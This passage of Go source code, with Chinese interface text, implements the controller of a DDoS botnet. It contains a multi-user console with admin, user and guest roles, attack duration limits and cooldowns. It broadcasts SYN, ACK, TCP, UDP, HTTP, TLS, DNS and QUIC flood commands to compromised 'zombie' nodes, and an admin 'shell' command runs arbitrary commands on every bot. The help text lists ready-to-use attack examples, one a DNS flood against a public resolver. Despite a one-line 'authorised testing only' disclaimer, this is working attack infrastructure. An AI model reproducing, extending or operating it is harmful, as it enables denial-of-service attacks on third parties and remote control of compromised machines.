	helpText += fmt.Sprintf("  %s                  %s\r\n", 
		green.Add(color.Bold).Sprint("logout"), white.Sprint("注销当前用户"))
	helpText += fmt.Sprintf("  %s/%s               %s\r\n", 
		green.Add(color.Bold).Sprint("quit"), green.Add(color.Bold).Sprint("exit"), white.Sprint("退出控制台"))
	
	if session.User.Role == RoleAdmin {
		helpText += fmt.Sprintf("\r\n%s\r\n", 
			magenta.Add(color.Bold).Add(color.Underline).Sprint("👑 管理员专属命令"))
		helpText += fmt.Sprintf("  %s %s          %s\r\n", 
			red.Add(color.Bold).Sprint("stop"), yellow.Sprint("[task_id]"), white.Sprint("停止当前或指定的攻击任务"))
		helpText += fmt.Sprintf("  %s %s         %s\r\n", 
			red.Add(color.Bold).Sprint("shell"), yellow.Sprint("<command>"), white.Sprint("在僵尸节点执行Shell命令"))
	}
	
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		cyan.Add(color.Underline).Sprint("========== 攻击命令详细格式 =========="))
	helpText += fmt.Sprintf("%s %s %s %s %s %s %s %s\r\n", 
		green.Add(color.Bold).Sprint("attack"), 
		yellow.Sprint("<模式>"), 
		yellow.Sprint("<目标>"), 
		yellow.Sprint("<端口>"), 
		yellow.Sprint("<速率(pps)>"), 
		yellow.Sprint("<持续时间(秒)>"), 
		yellow.Sprint("<线程数>"), 
		yellow.Sprint("<包大小(字节)> [可选参数...]"))
	
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		white.Add(color.Bold).Sprint("🎯 支持的攻击模式及详细示例"))
	
	// 攻击模式列表
	attackModes := []struct {
		name    string
		desc    string
		format  string
		example string
	}{
		{
			name:    "SYN Flood",
			desc:    "发送大量SYN包耗尽目标资源",
			format:  "attack syn <目标IP> <端口> <速率> <持续时间> <线程数> <包大小>",
			example: "attack syn 192.168.1.100 80 10000 60 20 1400",
		},
		{
			name:    "ACK Flood",
			desc:    "发送大量ACK包消耗目标处理能力",
			format:  "attack ack <目标IP> <端口> <速率> <持续时间> <线程数> <包大小>",
			example: "attack ack 10.0.0.1 443 5000 120 15 500",
		},
		{
			name:    "TCP Flood",
			desc:    "建立连接并发送数据",
			format:  "attack tcp <目标> <端口> <速率> <持续时间> <线程数> <包大小>",
			example: "attack tcp 目标域名或IP 8080 2000 300 10 1460",
		},
		{
			name:    "TCP Connection Flood",
			desc:    "TCP长连接攻击，建立大量并发连接",
			format:  "attack tcp_conn <目标> <端口> <并发连接数> <持续时间> <线程数> <包大小>",
			example: "attack tcp_conn 192.168.1.1 80 1000 300 5 1024",
		},
		{
			name:    "UDP Flood",
			desc:    "发送大量UDP数据包",
			format:  "attack udp <目标IP> <端口> <速率> <持续时间> <线程数> <包大小>",
			example: "attack udp 10.0.0.1 53 20000 60 20 512",
		},
		{
			name:    "HTTP GET Flood",
			desc:    "发送大量HTTP GET请求",
			format:  "attack http <目标> <端口> <速率> <持续时间> <线程数> <包大小> [主机头] [路径] [并发连接数]",
			example: "attack http www.example.com 80 1000 60 5 1024 www.example.com /api/test 50",
		},
		{
			name:    "TLS Handshake Flood",
			desc:    "SSL握手攻击",
			format:  "attack tls <目标> <端口> <速率> <持续时间> <线程数> <包大小> [SNI名称] [并发连接数]",
			example: "attack tls secure-site.com 443 800 180 8 768 secure-site.com 20",
		},
		{
			name:    "DNS Query Flood",
			desc:    "发送大量DNS查询请求",
			format:  "attack dns <目标DNS服务器IP> <端口> <速率> <持续时间> <线程数> <包大小> [查询域名]",
			example: "attack dns 8.8.8.8 53 5000 120 10 512 www.example.com",
		},
		{
			name:    "QUIC Protocol Flood",
			desc:    "QUIC协议攻击",
			format:  "attack quic <目标> <端口> <速率> <持续时间> <线程数> <包大小> [SNI名称] [并发连接数]",
			example: "attack quic quic.example.com 443 1000 180 8 1200 quic.example.com 25",
		},
	}
	
	// 输出攻击模式
	for i, mode := range attackModes {
		helpText += fmt.Sprintf("\r\n%s. %s\r\n", 
			cyan.Add(color.Bold).Sprint(i+1), magenta.Add(color.Bold).Sprint(mode.name))
		helpText += fmt.Sprintf("   %s: %s\r\n", 
			yellow.Sprint("格式"), green.Sprint(mode.format))
		helpText += fmt.Sprintf("   %s: %s\r\n", 
			yellow.Sprint("示例"), blue.Sprint(mode.example))
		helpText += fmt.Sprintf("   %s: %s\r\n", 
			yellow.Sprint("说明"), white.Sprint(mode.desc))
		
		// 特殊模式的参数说明
		if i == 5 { // HTTP GET Flood
			helpText += fmt.Sprintf("   %s:\r\n", yellow.Sprint("参数说明"))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("目标"), white.Sprint("可以是IP或域名（如 www.example.com）"))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("主机头"), white.Sprint("HTTP请求的Host头部，默认为目标地址"))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("路径"), white.Sprint("请求的URL路径，默认为\"/\""))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("并发连接数"), white.Sprint("每个线程维持的连接数，默认为10"))
		} else if i == 6 { // TLS Handshake Flood
			helpText += fmt.Sprintf("   %s:\r\n", yellow.Sprint("参数说明"))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("SNI名称"), white.Sprint("TLS握手ClientHello中的服务器名称指示，默认为目标地址"))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("并发连接数"), white.Sprint("每个线程维持的连接数，默认为10"))
		} else if i == 7 { // DNS Query Flood
			helpText += fmt.Sprintf("   %s:\r\n", yellow.Sprint("参数说明"))
			helpText += fmt.Sprintf("     - %s: %s\r\n", 
				yellow.Sprint("查询域名"), white.Sprint("指定要查询的域名，默认为随机生成"))
		}
	}
	
	// Shell Command
	helpText += fmt.Sprintf("\r\n%s. %s\r\n", 
		cyan.Add(color.Bold).Sprint("10"), magenta.Add(color.Bold).Sprint("Shell Command"))
	helpText += fmt.Sprintf("   %s: %s\r\n", 
		yellow.Sprint("格式"), white.Sprint("使用独立的'shell'命令，非attack命令"))
	helpText += fmt.Sprintf("   %s: %s\r\n", 
		yellow.Sprint("示例"), blue.Sprint("shell uptime"))
	helpText += fmt.Sprintf("   %s: %s\r\n", 
		yellow.Sprint("说明"), white.Sprint("在僵尸节点执行Shell命令"))
	
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		cyan.Add(color.Underline).Sprint("========== 参数通用说明 =========="))
	
	// 参数说明
	paramInfo := []struct {
		param string
		desc  string
		color *color.Color
	}{
		{"包大小", "范围 0-1400 字节 (0表示协议最小长度，不同模式有内置最小值)", blue},
		{"目标", "支持IP地址和域名，域名会自动解析", green},
		{"速率", "每秒数据包数/请求数 (pps)", yellow},
		{"持续时间", "攻击运行秒数", magenta},
		{"线程数", "每个僵尸节点启动的攻击线程", cyan},
	}
	
	for _, param := range paramInfo {
		helpText += fmt.Sprintf("  - %s: %s\r\n", 
			param.color.Add(color.Bold).Sprint(param.param), white.Sprint(param.desc))
	}
	
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		cyan.Add(color.Underline).Sprint("========== 权限与系统说明 =========="))
	
	// 权限说明
	roles := []struct {
		role  string
		desc  string
		color *color.Color
	}{
		{"管理员", "最大攻击时间3600秒，无冷却时间，可使用所有命令", red},
		{"普通用户", "最大攻击时间60秒，冷却时间120秒，系统为单任务模式", yellow},
		{"游客", "无攻击权限", white},
	}
	
	helpText += fmt.Sprintf("%s:\r\n", 
		white.Add(color.Bold).Sprint("权限级别"))
	for _, role := range roles {
		helpText += fmt.Sprintf("  - %s: %s\r\n", 
			role.color.Add(color.Bold).Sprint(role.role), white.Sprint(role.desc))
	}
	
	helpText += fmt.Sprintf("\r\n%s:\r\n", 
		white.Add(color.Bold).Sprint("系统状态"))
	helpText += fmt.Sprintf("  使用 '%s' 命令随时查看在线僵尸数、当前任务进度和系统运行时间\r\n", 
		green.Add(color.Bold).Sprint("stats"))
	
	// 添加实用提示
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		cyan.Add(color.Underline).Sprint("========== 实用提示 =========="))
	
	tips := []string{
		"💡 使用示例中的域名（如 www.example.com）进行测试",
		"🔍 DNS攻击可使用公开DNS服务器如 8.8.8.8",
		"⚡ 注意包大小对攻击效果的影响",
		"📊 使用 stats 命令实时监控攻击状态",
		"🛡️ 请遵守当地法律法规，仅用于授权测试",
	}
	
	for _, tip := range tips {
		helpText += fmt.Sprintf("  %s\r\n", tip)
	}
	
	helpText += fmt.Sprintf("\r\n%s\r\n", 
		cyan.Add(color.Underline).Sprint("=========================================="))
	
	// 发送帮助文本到用户连接
	session.Channel.Write([]byte(helpText))
}

func (c *Controller) sendUserStats(session *UserSession) {
	stats.mu.RLock()
	uptime := time.Since(stats.StartTime)
	activeConns := connectionCount.Load()
	
	// 创建缓冲区
	var statsText strings.Builder
	
	statsText.WriteString(fmt.Sprintf("\r\n%s\r\n", cyan.Sprint("系统统计:")))
	
	// 版本
	statsText.WriteString(fmt.Sprintf("  %s: v%s\r\n", 
		white.Sprint("版本"), VERSION))
	
	// 运行时间
	statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
		white.Sprint("运行时间"), magenta.Sprint(uptime.Round(time.Second))))
	
	// 总僵尸数
	statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
		white.Sprint("总僵尸数"), yellow.Sprint(stats.TotalConnections)))
	
	// 在线节点
	statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
		white.Sprint("在线节点"), green.Sprint(activeConns)))
	
	// 测试中僵尸
	statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
		white.Sprint("测试中僵尸"), red.Sprint(stats.TestingConnections)))
	
	// 总命令数
	statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
		white.Sprint("总命令数"), blue.Sprint(stats.TotalCommands)))
	
	if c.currentTask != nil {
		statsText.WriteString(fmt.Sprintf("\r\n%s\r\n", cyan.Sprint("当前攻击任务:")))
		
		// 使用正确的格式化
		statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
			white.Sprint("ID"), magenta.Sprint(c.currentTask.ID)))
		statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
			white.Sprint("创建者"), yellow.Sprint(c.currentTask.CreatedBy)))
		statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
			white.Sprint("模式"), red.Sprint(c.currentTask.Params.Mode.String())))
		statsText.WriteString(fmt.Sprintf("  %s: %s:%s\r\n", 
			white.Sprint("目标"), 
			green.Sprint(c.currentTask.Params.TargetIP), 
			magenta.Sprintf("%d", c.currentTask.Params.TargetPort)))
		statsText.WriteString(fmt.Sprintf("  %s: %s 字节\r\n", 
			white.Sprint("包大小"), blue.Sprintf("%d", c.currentTask.Params.PacketSize)))
		statsText.WriteString(fmt.Sprintf("  %s: %s/%s秒\r\n", 
			white.Sprint("持续时间"),
			yellow.Sprint(time.Since(c.currentTask.StartTime).Round(time.Second)), 
			magenta.Sprintf("%d", c.currentTask.Params.Duration)))
		statsText.WriteString(fmt.Sprintf("  %s: %s\r\n", 
			white.Sprint("状态"), getStatusColor(c.currentTask.Status)))
	} else {
		statsText.WriteString(fmt.Sprintf("\r\n%s\r\n", green.Sprint("当前无运行中的攻击任务")))
	}
	stats.mu.RUnlock()
	
	session.Channel.Write([]byte(statsText.String()))
}

// 状态颜色辅助函数
func getStatusColor(status string) string {
	switch status {
	case "运行中":
		return red.Sprint(status)
	case "已停止":
		return yellow.Sprint(status)
	case "已完成":
		return green.Sprint(status)
	default:
		return white.Sprint(status)
	}
}

func (c *Controller) handleUserAttack(args []string, session *UserSession) {
	if len(args) < 7 {
		session.Channel.Write([]byte("用法: attack <mode> <target> <port> <pps> <duration> <threads> <packet_size>\r\n"))
		session.Channel.Write([]byte("   包大小范围: 0-1400 字节 (0表示不填充数据)\r\n"))
		return
	}
	
	// 检查用户攻击权限和时间限制
	canAttack, reason := c.canUserAttack(session.User)
	if !canAttack {
		session.Channel.Write([]byte("无法发起攻击: " + reason + "\r\n"))
		return
	}
	
	var mode AttackMode
	switch args[0] {
	case "syn":
		mode = ModeSYN
	case "ack":
		mode = ModeACK
	case "tcp":
		mode = ModeTCP
	case "tcp_conn": // 新增：TCP长连接模式
		mode = ModeTCP_CONN
	case "udp": // 新增：UDP Flood模式
		mode = ModeUDP
	case "http":
		mode = ModeHTTP
	case "tls":
		mode = ModeTLS
	case "dns": // 新增：DNS查询模式
		mode = ModeDNS
	case "quic": // 新增：QUIC协议模式
		mode = ModeQUIC
	case "shell":
		mode = ModeShell
		session.Channel.Write([]byte("Shell模式需要管理员权限\r\n"))
		return
	default:
		session.Channel.Write([]byte("无效模式，可用: syn, ack, tcp, tcp_conn, udp, http, tls, dns, quic\r\n"))
		return
	}
	
	targetIP := strings.TrimSpace(args[1])
	
	// 增强：验证参数有效性
	port, err := strconv.Atoi(args[2])
	if err != nil || port < 1 || port > 65535 {
		session.Channel.Write([]byte("端口号无效，必须是1-65535之间的整数\r\n"))
		return
	}
	
	pps, err := strconv.Atoi(args[3])
	if err != nil || pps < 0 {
		session.Channel.Write([]byte("速率(pps)必须是非负整数\r\n"))
		return
	}
	
	duration, err := strconv.Atoi(args[4])
	if err != nil || duration < 0 {
		session.Channel.Write([]byte("持续时间必须是非负整数\r\n"))
		return
	}
	
	threads, err := strconv.Atoi(args[5])
	if err != nil || threads < 1 {
		session.Channel.Write([]byte("线程数必须是正整数\r\n"))
		return
	}
	
	packetSize, err := strconv.Atoi(args[6])
	if err != nil {
		session.Channel.Write([]byte("包大小必须是整数\r\n"))
		return
	}
	
	// 验证包大小
	if packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE {
		session.Channel.Write([]byte(fmt.Sprintf("包大小超出范围，有效范围: %d-%d 字节\r\n", MIN_PACKET_SIZE, MAX_PACKET_SIZE)))
		return
	}
	
	params := AttackParams{
		Mode:             mode,
		TargetIP:         targetIP,
		TargetPort:       port,
		PacketsPerSecond: pps,
		Duration:         duration,
		Threads:          threads,
		PacketSize:       packetSize,
		ConcurrentConns:  10, // 默认并发连接数
		Path:            "/", // 默认路径
	}
	
	// 解析可选参数 - 修复解析逻辑
	argIndex := 7
	if mode == ModeHTTP {
		// HTTP模式：可选的hostname, path, concurrent
		if len(args) > argIndex {
			params.Hostname = args[argIndex]
			argIndex++
		} else {
			params.Hostname = targetIP
		}
		
		if len(args) > argIndex {
			params.Path = args[argIndex]
			argIndex++
		}
		
		if len(args) > argIndex {
			if val, err := strconv.Atoi(args[argIndex]); err == nil && val > 0 {
				params.ConcurrentConns = val
			}
		}
	} else if mode == ModeTLS {
		// TLS模式：可选的hostname, concurrent
		if len(args) > argIndex {
			params.Hostname = args[argIndex]
			argIndex++
		} else {
			params.Hostname = targetIP
		}
		
		if len(args) > argIndex {
			if val, err := strconv.Atoi(args[argIndex]); err == nil && val > 0 {
				params.ConcurrentConns = val
			}
		}
	}
	
	// ========== 新增：检查攻击参数是否超出普通用户限制 ==========
    canUseParams, reason := c.canUserUseAttackParams(session.User, params)
    if !canUseParams {
        session.Channel.Write([]byte("攻击参数错误: " + reason + "\r\n"))
        return
    }
    // ========== 新增结束 ==========
	// 检查攻击时间限制
	canAttackDuration, reason := c.canUserAttackWithDuration(session.User, duration)
	if !canAttackDuration {
		session.Channel.Write([]byte("攻击时间限制: " + reason + "\r\n"))
		return
	}
	
	// 单任务模式检查
	c.mu.Lock()
	if c.currentTask != nil && c.currentTask.Status == "运行中" {
		c.mu.Unlock()
		session.Channel.Write([]byte("系统正在执行其他攻击任务，请等待当前任务完成\r\n"))
		return
	}
	c.mu.Unlock()
	
	taskID, err := c.StartAttack(params, nil, session.User.Username)
	if err != nil {
		session.Channel.Write([]byte("开始攻击失败: " + err.Error() + "\r\n"))
		return
	}
	
	// 带颜色的版本
	response := fmt.Sprintf("%s: %s\r\n", 
		green.Sprint("攻击任务已创建"), magenta.Sprint(taskID))
	response += fmt.Sprintf("%s: %s:%s\r\n", 
		white.Sprint("目标"), green.Sprint(targetIP), magenta.Sprintf("%d", port))
	response += fmt.Sprintf("%s: %s\r\n", 
		white.Sprint("模式"), red.Sprint(mode.String()))
	response += fmt.Sprintf("%s: %s 字节\r\n", 
		white.Sprint("包大小"), blue.Sprintf("%d", packetSize))
	response += fmt.Sprintf("%s: %s, %s: %s pps, %s: %s秒\r\n", 
		white.Sprint("线程"), magenta.Sprintf("%d", threads),
		white.Sprint("速率"), yellow.Sprintf("%d", pps),
		white.Sprint("持续时间"), cyan.Sprintf("%d", duration))

	if mode == ModeHTTP || mode == ModeTLS {
		response += fmt.Sprintf("%s: %s\r\n", 
			white.Sprint("主机头/SNI"), green.Sprint(params.Hostname))
		if mode == ModeHTTP {
			response += fmt.Sprintf("%s: %s\r\n", 
				white.Sprint("路径"), blue.Sprint(params.Path))
		}
		response += fmt.Sprintf("%s: %s\r\n", 
			white.Sprint("并发连接数"), yellow.Sprintf("%d", params.ConcurrentConns))
	}

	// 添加单任务模式提示
	response += fmt.Sprintf("%s\r\n", yellow.Sprint("系统为单任务模式，同时只能运行一个攻击任务"))
		
	session.Channel.Write([]byte(response))
}

func (c *Controller) handleUserStop(args []string, session *UserSession) {
	// 检查用户是否有权限使用stop命令
	if !c.canUserStop(session.User) {
		session.Channel.Write([]byte("权限不足，只有管理员可以停止攻击任务\r\n"))
		return
	}
	
	taskID := ""
	if len(args) > 0 {
		taskID = args[0]
	}
	
	c.StopAttack(taskID)
	session.Channel.Write([]byte("停止命令已发送\r\n"))
}

func (c *Controller) handleUserShell(args []string, session *UserSession) {
	if len(args) == 0 {
		session.Channel.Write([]byte("用法: shell <command>\r\n"))
		return
	}
	
	command := strings.Join(args, " ")
	c.BroadcastCommand("shell "+command, nil)
	
	session.Channel.Write([]byte("已广播shell命令: " + command + "\r\n"))
}

// ========================= 攻击权限检查 =========================
func (c *Controller) canUserAttack(user *User) (bool, string) {
	// 管理员无限制
	if user.Role == RoleAdmin {
		return true, ""
	}
	
	// 检查单任务模式
	c.mu.RLock()
	if c.currentTask != nil && c.currentTask.Status == "运行中" {
		c.mu.RUnlock()
		return false, "系统正在执行其他攻击任务，请等待当前任务完成"
	}
	c.mu.RUnlock()
	
	// 检查冷却时间
	user.mu.RLock()
	if user.InCooldown {
		remaining := time.Until(user.CooldownEnd)
		if remaining > 0 {
			user.mu.RUnlock()
			return false, fmt.Sprintf("冷却时间中，请等待 %v", remaining.Round(time.Second))
		} else {
			// 冷却时间结束
			user.mu.RUnlock()
			user.mu.Lock()
			user.InCooldown = false
			user.mu.Unlock()
		}
	} else {
		user.mu.RUnlock()
	}
	
	return true, ""
}

func (c *Controller) canUserAttackWithDuration(user *User, duration int) (bool, string) {
	// 管理员最长3600秒
	if user.Role == RoleAdmin {
		if duration > 3600 {
			return false, "管理员最大攻击时间为3600秒"
		}
		return true, ""
	}
	
	// 普通用户最长60秒
	if duration > 60 {
		return false, "普通用户最大攻击时间为60秒"
	}
	
	return true, ""
}

func (c *Controller) canUserStop(user *User) bool {
	// 只有管理员可以使用stop命令
	return user.Role == RoleAdmin
}

// ========================= 广播系统 =========================
func (c *Controller) broadcastWorker() {
	for msg := range c.broadcastChan {
		if msg == nil || c.shuttingDown.Load() {
			continue
		}
		
		commandCount.Add(1)
		stats.mu.Lock()
		stats.TotalCommands++
		stats.mu.Unlock()
		
		// 构造命令
		cmd := msg.Command
		if !strings.HasSuffix(cmd, "\n") {
			cmd += "\n"
		}
		
		cmdBytes := []byte(cmd)
		
		// 如果指定了目标，只发送给指定连接
		if len(msg.Targets) > 0 {
			c.broadcastToTargets(cmdBytes, msg.Targets)
		} else {
			// 广播给所有连接
			c.broadcastToAll(cmdBytes)
		}
	}
}

func (c *Controller) broadcastToAll(cmd []byte) {
	successCount := 0
	
	c.connections.Range(func(key, value interface{}) bool {
		conn := value.(*Connection)
		
		go func(c *Connection) {
			if c.sendCommand(cmd) == nil {
				successCount++
			}
		}(conn)
		
		return true
	})
	
	logger.Debug("广播完成", zap.Int("success", successCount))
}

func (c *Controller) broadcastToTargets(cmd []byte, targets []string) {
	for _, target := range targets {
		go func(t string) {
			if conn, ok := c.getConnection(t); ok {
				conn.sendCommand(cmd)
			}
		}(target)
	}
}

func (c *Controller) BroadcastCommand(command string, targets []string) {
	msg := &BroadcastMessage{
		Command:   command,
		Targets:   targets,
		Timestamp: time.Now(),
	}
	
	select {
	case c.broadcastChan <- msg:
	default:
		logger.Warn("广播队列已满，丢弃命令", zap.String("command", command))
	}
}

func (conn *Connection) sendCommand(cmd []byte) error {
	conn.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	
	_, err := conn.Conn.Write(cmd)
	return err
}

// ========================= 攻击控制 =========================
func (c *Controller) StartAttack(params AttackParams, targets []string, username string) (string, error) {
	// 单任务模式检查
	c.mu.Lock()
	if c.currentTask != nil && c.currentTask.Status == "运行中" {
		c.mu.Unlock()
		return "", fmt.Errorf("系统正在执行其他攻击任务")
	}
	
	taskID := generateID()
	
	// 构建命令（包含包大小参数）
	var cmd string
	if params.Mode == ModeShell {
		cmd = fmt.Sprintf("start %s %s", params.Mode.Short(), params.ShellCommand)
	} else {
		// 基础命令格式
		cmd = fmt.Sprintf("start %s %s %d %d %d %d %d", 
			params.Mode.Short(), params.TargetIP, params.TargetPort,
			params.PacketsPerSecond, params.Duration, params.Threads, params.PacketSize)
		
		// 添加可选参数
		if params.Mode == ModeHTTP {
			hostname := params.Hostname
			if hostname == "" {
				hostname = params.TargetIP
			}
			cmd += fmt.Sprintf(" %s %s %d", hostname, params.Path, params.ConcurrentConns)
		} else if params.Mode == ModeTLS {
			hostname := params.Hostname
			if hostname == "" {
				hostname = params.TargetIP
			}
			cmd += fmt.Sprintf(" %s %d", hostname, params.ConcurrentConns)
		}
	}
	
	// 创建任务
	task := &AttackTask{
		ID:        taskID,
		Params:    params,
		StartTime: time.Now(),
		Status:    "运行中",
		Agents:    targets,
		CreatedBy: username,
	}
	
	c.tasks.Store(taskID, task)
	c.currentTask = task
	c.mu.Unlock()
	
	// 更新连接状态
	for _, target := range targets {
		c.updateConnectionStatus(target, StatusTesting)
	}
	
	// 广播命令
	c.BroadcastCommand(cmd, targets)
	
	green.Printf("攻击任务已创建: %s (用户: %s)\n", taskID, username)
	magenta.Printf("目标: %s:%d\n", params.TargetIP, params.TargetPort)
	magenta.Printf("模式: %s\n", params.Mode.String())
	magenta.Printf("包大小: %d 字节\n", params.PacketSize)
	magenta.Printf("线程: %d, 速率: %d pps, 持续时间: %d秒\n", 
		params.Threads, params.PacketsPerSecond, params.Duration)
	
	// 如果是普通用户，设置冷却时间
	if user, ok := users[username]; ok && user.Role == RoleUser {
		user.mu.Lock()
		user.LastAttack = time.Now()
		user.InCooldown = true
		user.CooldownEnd = time.Now().Add(120 * time.Second)
		user.mu.Unlock()
	}
	
	// 启动定时器（如果设置了持续时间）
	if params.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(params.Duration) * time.Second)
			c.StopAttack(taskID)
			
			// 普通用户攻击结束后，启动冷却计时
			if user, ok := users[username]; ok && user.Role == RoleUser {
				user.mu.Lock()
				user.InCooldown = true
				user.CooldownEnd = time.Now().Add(120 * time.Second)
				user.mu.Unlock()
			}
		}()
	}
	
	logger.Info("攻击任务已开始",
		zap.String("task_id", taskID),
		zap.String("user", username),
		zap.String("mode", params.Mode.String()),
		zap.String("target", params.TargetIP),
		zap.Int("port", params.TargetPort),
		zap.Int("packet_size", params.PacketSize))
	
	return taskID, nil
}

func (c *Controller) StopAttack(taskID string) {
	var task *AttackTask
	
	if taskID == "" && c.currentTask != nil {
		task = c.currentTask
		taskID = c.currentTask.ID
	} else if t, ok := c.tasks.Load(taskID); ok {
		task = t.(*AttackTask)
	}
	
	if task == nil {
		yellow.Println("没有找到运行中的攻击任务")
		return
	}
	
	// 发送停止命令
	c.BroadcastCommand("stop", task.Agents)
	
	// 更新任务状态
	task.EndTime = time.Now()
	task.Status = "已停止"
	
	// 更新连接状态
	for _, agentID := range task.Agents {
		c.updateConnectionStatus(agentID, StatusConnected)
	}
	
	// 清除当前任务
	c.mu.Lock()
	c.currentTask = nil
	c.mu.Unlock()
	
	green.Printf("攻击任务已停止: %s\n", taskID)
	green.Printf("持续时间: %v\n", task.EndTime.Sub(task.StartTime).Round(time.Second))
}

// ========================= 定时器 =========================
func (c *Controller) startTimers() {
    // 心跳定时器
    c.heartbeatTicker = time.NewTicker(time.Duration(HEARTBEAT_INTERVAL) * time.Second)
    go func() {
        for range c.heartbeatTicker.C {
            c.sendHeartbeat()
        }
    }()
    
    // 统计定时器
    c.statsTicker = time.NewTicker(STATS_INTERVAL * time.Second)
    go func() {
        for range c.statsTicker.C {
            c.updateStats()
        }
    }()
    
    // 清理定时器
    c.cleanupTicker = time.NewTicker(5 * time.Minute)
    go func() {
        for range c.cleanupTicker.C {
            c.cleanupConnections()
        }
    }()
    
    // 用户清理定时器
    c.userCleanupTicker = time.NewTicker(1 * time.Minute)
    go func() {
        for range c.userCleanupTicker.C {
            c.cleanupUserSessions()
        }
    }()
    
    // 新增：用户配置重载定时器（每10秒检查一次）
    c.userReloadTicker = time.NewTicker(10 * time.Second)
    go func() {
        for range c.userReloadTicker.C {
            c.reloadUsers()
        }
    }()
    
    // 启动时立即加载一次用户配置
    c.reloadUsers()
}

// ========================= 用户配置热加载 =========================
func (c *Controller) reloadUsers() {
    data, err := os.ReadFile(config.UserFile)
    if err != nil {
        logger.Error("无法读取用户文件", 
            zap.String("file", config.UserFile), 
            zap.Error(err))
        return
    }
    
    // 解析新用户配置
    newUsers := make(map[string]*User)
    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if line == "" || strings.HasPrefix(line, "#") {
            continue
        }
        
        parts := strings.Split(line, ":")
        if len(parts) < 3 {
            continue
        }
        
        username := strings.TrimSpace(parts[0])
        password := strings.TrimSpace(parts[1])
        roleStr := strings.TrimSpace(parts[2])
        
        var role UserRole
        switch roleStr {
        case "admin":
            role = RoleAdmin
        case "user":
            role = RoleUser
        default:
            role = RoleGuest
        }
        
        // 检查用户是否已存在
        userMutex.RLock()
        existingUser, exists := users[username]
        userMutex.RUnlock()
        
        if exists {
            // 用户已存在，更新密码和角色，但保留登录状态
            existingUser.mu.Lock()
            existingUser.Password = password
            existingUser.Role = role
            existingUser.mu.Unlock()
            newUsers[username] = existingUser
            
            logger.Debug("更新用户配置", 
                zap.String("username", username),
                zap.String("role", role.String()))
        } else {
            // 新用户
            newUsers[username] = &User{
                Username:   username,
                Password:   password,
                Role:       role,
                LastLogin:  time.Time{},
                LoginCount: 0,
                IsLoggedIn: false,
            }
            
            logger.Info("添加新用户", 
                zap.String("username", username),
                zap.String("role", role.String()))
        }
    }
    
    // 获取当前用户列表，找出被删除的用户
    var removedUsers []string
    userMutex.RLock()
    for username := range users {
        if _, exists := newUsers[username]; !exists {
            removedUsers = append(removedUsers, username)
        }
    }
    userMutex.RUnlock()
    
    // 处理被删除的用户
    for _, username := range removedUsers {
        userMutex.RLock()
        user := users[username]
        userMutex.RUnlock()
        
        if user != nil {
            if user.IsLoggedIn {
                // 如果用户当前已登录，不立即删除，只标记为禁用
                logger.Warn("用户被删除但仍在登录状态，标记为禁用",
                    zap.String("username", username))
                // 这里可以添加逻辑断开用户连接，但为了安全，我们只记录日志
            } else {
                // 用户未登录，可以直接移除
                userMutex.Lock()
                delete(users, username)
                userMutex.Unlock()
                
                logger.Info("移除用户", 
                    zap.String("username", username))
            }
        }
    }
    
    // 更新全局用户映射
    userMutex.Lock()
    users = newUsers
    userMutex.Unlock()
    
    logger.Debug("用户配置重载完成", 
        zap.Int("user_count", len(newUsers)),
        zap.Int("removed_count", len(removedUsers)))
}

func (c *Controller) sendHeartbeat() {
	c.BroadcastCommand("PING", nil)
	
	// 清理超时连接
	c.connections.Range(func(key, value interface{}) bool {
		conn := value.(*Connection)
		if time.Since(conn.LastSeen) > time.Duration(config.HeartbeatTimeout)*time.Second {
			c.removeConnection(conn.ID)
		}
		return true
	})
}

func (c *Controller) updateStats() {
	stats.mu.Lock()
	stats.Uptime = time.Since(stats.StartTime)
	stats.mu.Unlock()
}

func (c *Controller) cleanupConnections() {
	// 清理长时间无响应的连接
	cutoffTime := time.Now().Add(-time.Duration(config.HeartbeatTimeout) * time.Second)
	
	var toRemove []string
	
	c.connections.Range(func(key, value interface{}) bool {
		conn := value.(*Connection)
		if conn.LastSeen.Before(cutoffTime) {
			toRemove = append(toRemove, conn.ID)
		}
		return true
	})
	
	for _, id := range toRemove {
		c.removeConnection(id)
	}
	
	if len(toRemove) > 0 {
		logger.Info("清理连接", zap.Int("count", len(toRemove)))
	}
}

func (c *Controller) cleanupUserSessions() {
	// 清理长时间不活动的用户会话
	cutoffTime := time.Now().Add(-30 * time.Minute)
	
	var toRemove []string
	
	c.userSessions.Range(func(key, value interface{}) bool {
		session := value.(*UserSession)
		if session.LastActive.Before(cutoffTime) {
			toRemove = append(toRemove, session.RemoteAddr)
		}
		return true
	})
	
	for _, addr := range toRemove {
		if sess, ok := c.userSessions.Load(addr); ok {
			session := sess.(*UserSession)
			session.Channel.Write([]byte("\r\n会话超时，自动注销\r\n"))
			c.logoutUser(session)
		}
	}
	
	if len(toRemove) > 0 {
		logger.Info("清理用户会话", zap.Int("count", len(toRemove)))
	}
}

// ========================= 关闭函数 =========================
func (c *Controller) Shutdown() {
	if c.shuttingDown.Load() {
		return
	}
	
	c.shuttingDown.Store(true)
	c.running.Store(false)
	
	fmt.Println("\n正在关闭控制器...")
	
	// 停止定时器
	if c.heartbeatTicker != nil {
		c.heartbeatTicker.Stop()
	}
	if c.statsTicker != nil {
		c.statsTicker.Stop()
	}
